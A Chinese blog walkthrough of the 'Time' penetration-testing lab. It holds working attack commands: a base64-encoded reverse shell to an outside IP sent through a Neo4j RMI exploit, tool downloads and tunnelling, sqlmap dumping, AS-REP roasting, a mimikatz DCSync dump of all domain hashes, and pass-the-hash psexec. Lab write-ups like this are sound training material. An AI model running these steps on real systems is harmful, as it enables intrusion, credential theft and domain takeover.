---
title: "春秋云镜 Time"
onlyTitle: true
date: 2025-9-15 20:09:32
categories:
- 渗透
- 春秋云镜
tags:
- 春秋云镜
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8171.jpg

---



## Time

### flag1

39.99.149.212

FScan_2.0.1_windows_x64.exe -h 39.99.149.212 -p 1-65535

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250924085701810.png)

访问7474，得到neo4j的webconsole控制面板

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250924090326822.png)

neo4j数据库端口为7687，默认账密neo4j/neo4j，尝试登录

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250924090426908.png)

说是安全原因不允许登录

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250924091219552.png)

其实是防火墙原因，把本地科学上网关掉就能登进去了，登进去是改密码

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250924091529284.png)

随便生成一个密码Loaf 6th generation Extended 88

看到DBMS为3.4.18版本

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250924091624772.png)

可以用exploitdb上的payload打RMI

https://www.exploit-db.com/exploits/50170

不过方便肯定是别人编译好的方便https://github.com/zwjjustdoit/CVE-2021-34371.jar

反弹shell

bash -i >& /dev/tcp/43.228.71.225/33539 0>&1

```shell
java -jar rhino_gadget.jar rmi://39.98.112.133:1337 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80My4yMjguNzEuMjI1LzMzNTM5IDA+JjE=}|{base64,-d}|{bash,-i}"
```

弹回shell

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250924093316038.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250924093130027.png)

>github进单文件点下载这种二进制文件可能不完整，整个master zip下下来是完整的。

只是个普通权限

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250924093524071.png)

整个靶机跟其他靶机很不一样，因为他在home下面居然放了个flag

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250924093651911.png)

flag01: flag{315a3987-665a-4722-ac37-e94d8a52a539}



### flag2

这里居然不用提权的说

看下靶机ip段，172.22.6.0/24

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250924102614584.png)

本来写ssh公钥的，后来发现服务账号一般是禁止ssh登录的，etc/passwd中neo4j的shell是/usr/sbin/nologin

```shell
echo "ssh-rsa xxx rsa 4096-20250810" >> /home/neo4j/.ssh/authorized_keys
```

一般要用sudo去改`sudo usermod -s /bin/bash neo4j`，这里肯定是改不了了

本地开个http服务，把gost和fscan传上去，fscan扫网段

```shell
python -m http.server 19998

wget http://97mf319592.goho.co/gost
wget http://97mf319592.goho.co/FScan_2.0.1_linux_x64

chmod 777 gost
chmod 777 FScan_2.0.1_linux_x64
./FScan_2.0.1_linux_x64 -h 172.22.6.0/24 -p 1-65535

#内网穿透
./gost -L socks5://:5555?bind=true

gost -L rtcp://:2222/39.98.112.133:22 -F socks5://39.98.112.133:5555
```

额，我windows弹的shell，fscan弹回来的回显全是乱码，我就不贴了，贴一个别人的

```shell
  1neo4j@ubuntu:/tmp$ fscan -h 172.22.6.0/24 -p 1-65535
  2┌──────────────────────────────────────────────┐
  3│    ___                              _        │
  4│   / _ \     ___  ___ _ __ __ _  ___| | __    │
  5│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
  6│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
  7│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
  8└──────────────────────────────────────────────┘
  9      Fscan Version: 2.0.0
 10
 11[2025-04-08 11:59:45] [INFO] 暴力破解线程数: 1
 12[2025-04-08 11:59:45] [INFO] 开始信息扫描
 13[2025-04-08 11:59:45] [INFO] CIDR范围: 172.22.6.0-172.22.6.255
 14[2025-04-08 11:59:45] [INFO] 生成IP范围: 172.22.6.0.%!d(string=172.22.6.255) - %!s(MISSING).%!d(MISSING)
 15[2025-04-08 11:59:45] [INFO] 解析CIDR 172.22.6.0/24 -> IP范围 172.22.6.0-172.22.6.255
 16[2025-04-08 11:59:45] [INFO] 已排除指定主机: 1 个
 17[2025-04-08 11:59:45] [INFO] 最终有效主机数量: 255
 18[2025-04-08 11:59:45] [INFO] 开始主机扫描
 19[2025-04-08 11:59:45] [INFO] 正在尝试无监听ICMP探测...
 20[2025-04-08 11:59:45] [INFO] 当前用户权限不足,无法发送ICMP包
 21[2025-04-08 11:59:45] [INFO] 切换为PING方式探测...
 22[2025-04-08 11:59:45] [SUCCESS] 目标 172.22.6.12     存活 (ICMP)
 23[2025-04-08 11:59:48] [SUCCESS] 目标 172.22.6.25     存活 (ICMP)
 24[2025-04-08 11:59:48] [SUCCESS] 目标 172.22.6.38     存活 (ICMP)
 25[2025-04-08 11:59:51] [INFO] 存活主机数量: 3
 26[2025-04-08 11:59:51] [INFO] 有效端口数量: 65535
 27[2025-04-08 11:59:51] [SUCCESS] 端口开放 172.22.6.38:22
 28[2025-04-08 11:59:51] [SUCCESS] 端口开放 172.22.6.12:53
 29[2025-04-08 11:59:51] [SUCCESS] 端口开放 172.22.6.38:80
 30[2025-04-08 11:59:51] [SUCCESS] 端口开放 172.22.6.12:88
 31[2025-04-08 11:59:51] [SUCCESS] 服务识别 172.22.6.38:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]
 32[2025-04-08 11:59:51] [SUCCESS] 端口开放 172.22.6.12:135
 33[2025-04-08 11:59:52] [SUCCESS] 端口开放 172.22.6.12:139
 34[2025-04-08 11:59:52] [SUCCESS] 端口开放 172.22.6.25:139
 35[2025-04-08 11:59:52] [SUCCESS] 端口开放 172.22.6.25:135
 36[2025-04-08 11:59:55] [SUCCESS] 端口开放 172.22.6.12:389
 37[2025-04-08 11:59:56] [SUCCESS] 端口开放 172.22.6.12:445
 38[2025-04-08 11:59:56] [SUCCESS] 端口开放 172.22.6.25:445
 39[2025-04-08 11:59:56] [SUCCESS] 端口开放 172.22.6.12:464
 40[2025-04-08 11:59:56] [SUCCESS] 服务识别 172.22.6.12:88 => 
 41[2025-04-08 11:59:56] [SUCCESS] 服务识别 172.22.6.38:80 => [http]
 42[2025-04-08 11:59:57] [SUCCESS] 端口开放 172.22.6.12:593
 43[2025-04-08 11:59:57] [SUCCESS] 端口开放 172.22.6.12:636
 44[2025-04-08 11:59:57] [SUCCESS] 服务识别 172.22.6.12:593 => [ncacn_http] 版本:1.0 产品:Microsoft Windows RPC over HTTP 系统:Windows Banner:[ncacn_http/1.0]
 45[2025-04-08 11:59:57] [SUCCESS] 服务识别 172.22.6.12:636 => 
 46[2025-04-08 11:59:57] [SUCCESS] 服务识别 172.22.6.12:139 =>  Banner:[.]
 47[2025-04-08 11:59:57] [SUCCESS] 服务识别 172.22.6.25:139 =>  Banner:[.]
 48[2025-04-08 11:59:58] [SUCCESS] 端口开放 172.22.6.12:3268
 49[2025-04-08 11:59:58] [SUCCESS] 端口开放 172.22.6.12:3269
 50[2025-04-08 11:59:58] [SUCCESS] 服务识别 172.22.6.12:3269 => 
 51[2025-04-08 11:59:59] [SUCCESS] 端口开放 172.22.6.12:3389
 52[2025-04-08 11:59:59] [SUCCESS] 端口开放 172.22.6.25:3389
 53[2025-04-08 12:00:00] [SUCCESS] 服务识别 172.22.6.12:389 => [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name
 54[2025-04-08 12:00:01] [SUCCESS] 服务识别 172.22.6.12:445 => 
 55[2025-04-08 12:00:01] [SUCCESS] 服务识别 172.22.6.25:445 => 
 56[2025-04-08 12:00:02] [SUCCESS] 服务识别 172.22.6.12:464 => 
 57[2025-04-08 12:00:03] [SUCCESS] 服务识别 172.22.6.12:3268 => [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name
 58[2025-04-08 12:00:04] [SUCCESS] 服务识别 172.22.6.25:3389 => 
 59[2025-04-08 12:00:15] [SUCCESS] 端口开放 172.22.6.12:9389
 60[2025-04-08 12:00:20] [SUCCESS] 服务识别 172.22.6.12:9389 => 
 61[2025-04-08 12:00:40] [SUCCESS] 端口开放 172.22.6.12:15774
 62[2025-04-08 12:00:40] [SUCCESS] 端口开放 172.22.6.25:15774
 63[2025-04-08 12:00:51] [SUCCESS] 服务识别 172.22.6.12:15774 => 
 64[2025-04-08 12:00:51] [SUCCESS] 服务识别 172.22.6.25:15774 => 
 65[2025-04-08 12:00:51] [SUCCESS] 服务识别 172.22.6.12:53 => 
 66[2025-04-08 12:00:57] [SUCCESS] 服务识别 172.22.6.12:135 => 
 67[2025-04-08 12:00:57] [SUCCESS] 服务识别 172.22.6.25:135 => 
 68[2025-04-08 12:01:04] [SUCCESS] 服务识别 172.22.6.12:3389 => 
 69[2025-04-08 12:02:16] [SUCCESS] 端口开放 172.22.6.25:47001
 70[2025-04-08 12:02:16] [SUCCESS] 端口开放 172.22.6.12:47001
 71[2025-04-08 12:02:21] [SUCCESS] 服务识别 172.22.6.25:47001 => [http]
 72[2025-04-08 12:02:21] [SUCCESS] 服务识别 172.22.6.12:47001 => [http]
 73[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.12:49664
 74[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.12:49666
 75[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.25:49665
 76[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.12:49665
 77[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.25:49664
 78[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.25:49667
 79[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.12:49667
 80[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.25:49666
 81[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.25:49668
 82[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.25:49669
 83[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.25:49670
 84[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.12:49671
 85[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.12:49674
 86[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.12:49675
 87[2025-04-08 12:02:22] [SUCCESS] 服务识别 172.22.6.12:49674 => [ncacn_http] 版本:1.0 产品:Microsoft Windows RPC over HTTP 系统:Windows Banner:[ncacn_http/1.0]
 88[2025-04-08 12:02:23] [SUCCESS] 端口开放 172.22.6.25:49675
 89[2025-04-08 12:02:23] [SUCCESS] 端口开放 172.22.6.25:49676
 90[2025-04-08 12:02:23] [SUCCESS] 端口开放 172.22.6.12:49678
 91[2025-04-08 12:02:23] [SUCCESS] 端口开放 172.22.6.12:49687
 92[2025-04-08 12:02:23] [SUCCESS] 端口开放 172.22.6.12:49772
 93[2025-04-08 12:02:34] [SUCCESS] 端口开放 172.22.6.12:54921
 94[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.12:49664 => 
 95[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.12:49666 => 
 96[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.25:49665 => 
 97[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.12:49665 => 
 98[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.25:49664 => 
 99[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.25:49667 => 
100[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.12:49667 => 
101[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.25:49666 => 
102[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.25:49668 => 
103[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.25:49669 => 
104[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.25:49670 => 
105[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.12:49671 => 
106[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.12:49675 => 
107[2025-04-08 12:03:18] [SUCCESS] 服务识别 172.22.6.25:49675 => 
108[2025-04-08 12:03:18] [SUCCESS] 服务识别 172.22.6.25:49676 => 
109[2025-04-08 12:03:18] [SUCCESS] 服务识别 172.22.6.12:49678 => 
110[2025-04-08 12:03:18] [SUCCESS] 服务识别 172.22.6.12:49687 => 
111[2025-04-08 12:03:18] [SUCCESS] 服务识别 172.22.6.12:49772 => 
112[2025-04-08 12:03:29] [SUCCESS] 服务识别 172.22.6.12:54921 => 
113[2025-04-08 12:03:29] [INFO] 存活端口数量: 43
114[2025-04-08 12:03:29] [INFO] 开始漏洞扫描
115[2025-04-08 12:03:29] [INFO] 加载的插件: findnet, ldap, ms17010, netbios, rdp, smb, smb2, smbghost, ssh, webpoc, webtitle
116[2025-04-08 12:03:29] [SUCCESS] NetInfo 扫描结果
117目标主机: 172.22.6.12
118主机名: DC-PROGAME
119发现的网络接口:
120   IPv4地址:
121      └─ 172.22.6.12
122[2025-04-08 12:03:29] [SUCCESS] NetInfo 扫描结果
123目标主机: 172.22.6.25
124主机名: WIN2019
125发现的网络接口:
126   IPv4地址:
127      └─ 172.22.6.25
128[2025-04-08 12:03:29] [SUCCESS] NetBios 172.22.6.25     XIAORANG\WIN2019              
129[2025-04-08 12:03:29] [SUCCESS] 网站标题 http://172.22.6.38        状态码:200 长度:1531   标题:后台登录
130[2025-04-08 12:03:29] [INFO] 系统信息 172.22.6.12 [Windows Server 2016 Datacenter 14393]
131[2025-04-08 12:03:29] [SUCCESS] NetBios 172.22.6.12     DC:DC-PROGAME.xiaorang.lab       Windows Server 2016 Datacenter 14393

```

三个机器

```
172.22.6.12 DC-PROGAME [Windows Server 2016 Datacenter 14393]
172.22.6.25 WIN2019
172.22.6.38 
```

首先是38的机器，fscan已经显示后台登录

```shell
129[2025-04-08 12:03:29] [SUCCESS] 网站标题 http://172.22.6.38        状态码:200 长度:1531   标题:后台登录
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250924105149284.png)

sqlmap梭

```shell
python sqlmap.py -u http://172.22.6.38/index.php -data "username=admin&password=*" --dump
```

```shell
Database: oa_db
Table: oa_admin
[1 entry]
+----+------------------+---------------+
| id | password         | username      |
+----+------------------+---------------+
| 1  | bo2y8kAL3HnXUiQo | administrator |
+----+------------------+---------------+
Database: oa_db
Table: oa_f1Agggg
[1 entry]
+----+--------------------------------------------+
| id | flag02                                     |
+----+--------------------------------------------+
| 1  | flag{b142f5ce-d9b8-4b73-9012-ad75175ba029} |
+----+--------------------------------------------+
[10:54:07] [INFO] table 'oa_db.oa_users' dumped to CSV file 'C:\Users\19583\AppData\Local\sqlmap\output\172.22.6.38\dump\oa_db\oa_users.csv'
```

用户数据保存在了dump\oa_db下，有500个用户和一个administrator



### flag3

打AS-REPRoasting

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250924105910257.png)

注意我们sql注入dump下来的表里只有email phone username，没有密码，所以这里才会想到打这个口令破解攻击

一般是用impacket-GetNPUsers进行枚举收集用户的TGT票据，在用hashcat爆破出明文密码

把email提出来

```shell
python GetNPUsers.py -dc-ip 172.22.6.12 -usersfile email.txt xiaorang.lab/
```

```shell
$krb5asrep$23$zhangxin@xiaorang.lab@XIAORANG.LAB:ef426e31380b103fe311d95cbc7030da$63ec2becac781df9db42e3b3a0b109d7b3f768c20269f57b32c11302d9010dd4778c373c0a48445dca5bf9cf38b12f549faa09e3c92cb6d83d50040527bca65b48ba12d8c25b7627b114332b723fe18e89edb9ac22aace474897670a24c909f96712956e869b2689c90a6cbde1e0ead16170128b87d668ee4c2ea845c973903be4dacdfa6e4529c8a20846290b76f2c874bb3e539f792236957e12b8c535b0f6c4deae5e35e197626c15d0a13e4cdccfe8241154892dd9f413b9ff2e652fb53102d1d3380559e34720397eda1dbf3ca717ccbe2f859f0396fe55da063f1aa6b2b2160c16836a42956c92fbb1

$krb5asrep$23$wenshao@xiaorang.lab@XIAORANG.LAB:939906eb4f5ae473d119acd810316fb6$f1817d45b8cf511fd8e94dfb44cf983e03dbbe79a9341b1a14c0303711454000a58cda25b7d5f2ecee4f039db1bceae571b7483c9ba3a15474e010c759136168363f4b2322c1e3640da11228132c5a570cd022ab579222462fd64be87c6ce63705e48b3dee3705ee4f2228df1d028d5a5511ba616db4c074ef69bccc15b8426effd7805392bca64e4b87c847569c4a6fb7f244d765489ccefe3688b282fff304f1765c1426b286261e00b183e604734ff22dbbc6ae9e4e8b1892584eccaaea59c70c04eed3dab9de18d0453234154b7233d61ce621042558bbb65339558054df0da08f1602819405f0c7801b
```

得到如上两个用户的密码票据，丢到hashcat里爆破，字典用kali自带的rockyou.txt

```shell
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
cp /usr/share/wordlists/rockyou.txt /home/kali/Desktop/
hashcat -a 0 -m 18200 user rockyou.txt --force
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250924112728976.png)

```
wenshao@xiaorang.lab/hellokitty
zhangxin@xiaorang.lab/strawberry
```

有了账号密码，尝试rdp到172.22.6.12，发现没授权远程登录，尝试rdp到172.22.6.25

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250924113048464.png)

传SharpHound上去信息收集

SharpHound.exe -c all

压缩包导入BloodHound后Find Shortest Paths to Domain Admins

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250924114719336.png)

唯一与WIN2019也就是我们登录上去用户所关联的就是YUXUAN用户

该用户对ADMINISTRATOR有HasSIDHistory权限

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250924115004444.png)

可以看到有SIDHistory注入

另外，WIN2019还有对YUXUAN的HasSession，说明用户登陆过该主机。凭据会保留在内存中。

有很多方法可以获取到该凭据

一种是查注册表

```shell
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

>在 Windows 系统中，域用户自动登录的相关设置保存在注册表中。具体路径为 `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`。若该路径下存在 `AutoAdminLogon` 键值且其数据数值为 `1`，同时 `DefaultDomainName` `DefaultUserName` `DefaultPassword` 等键值也有相应的正确设置，那么说明该域用户设置了自动登录。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250924115422873.png)

得到账密

```
yuxuan/Yuxuan7QbrgZ3L
```

一种是msf的脚本windows/gather/credentials/windows_autologin

还有一种是用WinPEARS

获取到了账密，重新rdp上去

yuxuan@xiaorang.lab/Yuxuan7QbrgZ3L

既然都登上了yuxuan这个对ADMINISTRATOR有HasSIDHistory权限的账户了，有SID History这个用户可以访问域管的资源。可以直接传mimikatz上去dump域控hash

```shell
C:\Users\yuxuan\Desktop\x64>mimikatz

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /domain:xiaorang.lab /all /csv
[DC] 'xiaorang.lab' will be the domain
[DC] 'DC-PROGAME.xiaorang.lab' will be the DC server
[DC] Exporting domain 'xiaorang.lab'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
1103    shuzhen 07c1f387d7c2cf37e0ca7827393d2327        512
1104    gaiyong 52c909941c823dbe0f635b3711234d2e        512
1106    xiqidi  a55d27cfa25f3df92ad558c304292f2e        512
1107    wengbang        6b1d97a5a68c6c6c9233d11274d13a2e        512
1108    xuanjiang       a72a28c1a29ddf6509b8eabc61117c6c        512
1109    yuanchang       e1cea038f5c9ffd9dc323daf35f6843b        512
1110    lvhui   f58b31ef5da3fc831b4060552285ca54        512
1111    wenbo   9abb7115997ea03785e92542f684bdde        512
1112    zhenjun 94c84ba39c3ece24b419ab39fdd3de1a        512
1113    jinqing 4bf6ad7a2e9580bc8f19323f96749b3a        512
1115    yangju  1fa8c6b4307149415f5a1baffebe61cf        512
1117    weicheng        796a774eace67c159a65d6b86fea1d01        512
1118    weixian 8bd7dc83d84b3128bfbaf165bf292990        512
1119    haobei  045cc095cc91ba703c46aa9f9ce93df1        512
1120    jizhen  1840c5130e290816b55b4e5b60df10da        512
1121    jingze  3c8acaecc72f63a4be945ec6f4d6eeee        512
1122    rubao   d8bd6484a344214d7e0cfee0fa76df74        512
1123    zhaoxiu 694c5c0ec86269daefff4dd611305fab        512
1124    tangshun        90b8d8b2146db6456d92a4a133eae225        512
1125    liangliang      c67cd4bae75b82738e155df9dedab7c1        512
1126    qiyue   b723d29e23f00c42d97dd97cc6b04bc8        512
1127    chouqian        c6f0585b35de1862f324bc33c920328d        512
1128    jicheng 159ee55f1626f393de119946663a633c        512
1129    xiyi    ee146df96b366efaeb5138832a75603b        512
1130    beijin  a587b90ce9b675c9acf28826106d1d1d        512
1131    chenghui        08224236f9ddd68a51a794482b0e58b5        512
1132    chebin  b50adfe07d0cef27ddabd4276b3c3168        512
1133    pengyuan        a35d8f3c986ab37496896cbaa6cdfe3e        512
1134    yanglang        91c5550806405ee4d6f4521ba6e38f22        512
1135    jihuan  cbe4d79f6264b71a48946c3fa94443f5        512
1136    duanmuxiao      494cc0e2e20d934647b2395d0a102fb0        512
1137    hongzhi f815bf5a1a17878b1438773dba555b8b        512
1138    gaijin  b1040198d43631279a63b7fbc4c403af        512
1139    yifu    4836347be16e6af2cd746d3f934bb55a        512
1140    fusong  adca7ec7f6ab1d2c60eb60f7dca81be7        512
1141    luwan   c5b2b25ab76401f554f7e1e98d277a6a        512
1142    tangrong        2a38158c55abe6f6fe4b447fbc1a3e74        512
1143    zhufeng 71e03af8648921a3487a56e4bb8b5f53        512
1145    dongcheng       f2fdf39c9ff94e24cf185a00bf0a186d        512
1146    lianhuangchen   23dc8b3e465c94577aa8a11a83c001af        512
1147    lili    b290a36500f7e39beee8a29851a9f8d5        512
1148    huabi   02fe5838de111f9920e5e3bb7e009f2f        512
1149    rangsibo        103d0f70dc056939e431f9d2f604683c        512
1150    wohua   cfcc49ec89dd76ba87019ca26e5f7a50        512
1151    haoguang        33efa30e6b3261d30a71ce397c779fda        512
1152    langying        52a8a125cd369ab16a385f3fcadc757d        512
1153    diaocai a14954d5307d74cd75089514ccca097a        512
1154    lianggui        4ae2996c7c15449689280dfaec6f2c37        512
1155    manxue  0255c42d9f960475f5ad03e0fee88589        512
1156    baqin   327f2a711e582db21d9dd6d08f7bdf91        512
1157    chengqiu        0d0c1421edf07323c1eb4f5665b5cb6d        512
1158    louyou  a97ba112b411a3bfe140c941528a4648        512
1159    maqun   485c35105375e0754a852cee996ed33b        512
1160    wenbiao 36b6c466ea34b2c70500e0bfb98e68bc        512
1161    weishengshan    f60a4233d03a2b03a7f0ae619c732fae        512
1163    chuyuan 0cfdca5c210c918b11e96661de82948a        512
1164    wenliang        a4d2bacaf220292d5fdf9e89b3513a5c        512
1165    yulvxue cf970dea0689db62a43b272e2c99dccd        512
1166    luyue   274d823e941fc51f84ea323e22d5a8c4        512
1167    ganjian 7d3c39d94a272c6e1e2ffca927925ecc        512
1168    pangzhen        51d37e14983a43a6a45add0ae8939609        512
1169    guohong d3ce91810c1f004c782fe77c90f9deb6        512
1170    lezhong dad3990f640ccec92cf99f3b7be092c7        512
1171    sheweiyue       d17aecec7aa3a6f4a1e8d8b7c2163b35        512
1172    dujian  8f7846c78f03bf55685a697fe20b0857        512
1173    lidongjin       34638b8589d235dea49e2153ae89f2a1        512
1174    hongqun 6c791ef38d72505baeb4a391de05b6e1        512
1175    yexing  34842d36248c2492a5c9a1ae5d850d54        512
1176    maoda   6e65c0796f05c0118fbaa8d9f1309026        512
1177    qiaomei 6a889f350a0ebc15cf9306687da3fd34        512
502     krbtgt  a4206b127773884e2c7ea86cdd282d9c        514
500     Administrator   04d93ffd6f5f6e4490e0de23f240a5e9        512
1000    DC-PROGAME$     0ce73b5a0d2b6c8378fb36fcc7563697        532480
1181    WIN2019$        c126f9317537b5779d747b85080e2e53        4096
1178    wenshao b31c6aa5660d6e87ee046b1bb5d0ff79        4260352
1179    zhangxin        d6c5976e07cdb410be19b84126367e3d        4260352
1180    yuxuan  376ece347142d1628632d440530e8eed        66048
```

得到Administrator   04d93ffd6f5f6e4490e0de23f240a5e9



pth上域控

```shell
python psexec.py -hashes :04d93ffd6f5f6e4490e0de23f240a5e9 xiaorang.lab/administrator@172.22.6.25 -codec gbk
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250924121321284.png)

type c:\Users\Administrator\flag\flag03.txt

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250924121523511.png)

flag03: flag{3fccd022-1f9a-4af2-9ef3-ea9abd26acad}

### flag4

```shell
python psexec.py -hashes :04d93ffd6f5f6e4490e0de23f240a5e9 xiaorang.lab/administrator@172.22.6.12 -codec gbk
type c:\Users\Administrator\flag\flag04.txt

```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250924121634117.png)

flag04: flag{0a698e3c-c522-426e-809c-d7a5d6d642a8}